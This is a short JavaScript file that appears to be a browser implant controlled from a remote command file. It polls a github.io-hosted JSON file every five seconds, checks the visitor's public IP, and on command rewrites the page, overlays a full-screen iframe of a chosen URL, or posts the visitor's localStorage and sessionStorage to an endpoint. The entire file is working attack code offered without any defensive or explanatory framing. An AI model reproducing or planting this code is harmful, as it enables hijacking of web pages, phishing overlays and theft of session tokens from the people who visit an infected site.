var previous = ""

function execution27() {
    setTimeout(() => {
        fetch('https://paipai27.github.io/in27/commnd.json')
        .then(response => response.json())
        .then(rejson => {
            if (previous == rejson.cmd)
                return
                
            previous = rejson.cmd

            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                if (rejson.target == data.ip || rejson == "*")
                {
                    if (rejson.cmd == "write")
                        document.write(rejson.content)
                        
                    else if (rejson.cmd == "replace")
                        document.write("<iframe src='" + rejson.content + "' style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;'></iframe>")

                    else if (rejson.cmd == "$retrieve")
                        fetch("endpoint", {
                            method: 'POST',
                            headers: {
                                Accept: 'application/json',
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                "localStorage": localStorage,
                                "sessionStorage": sessionStorage
                            })
                        })
                }
            })
        });
        
        execution27()
    }, 5000)
}

execution27()
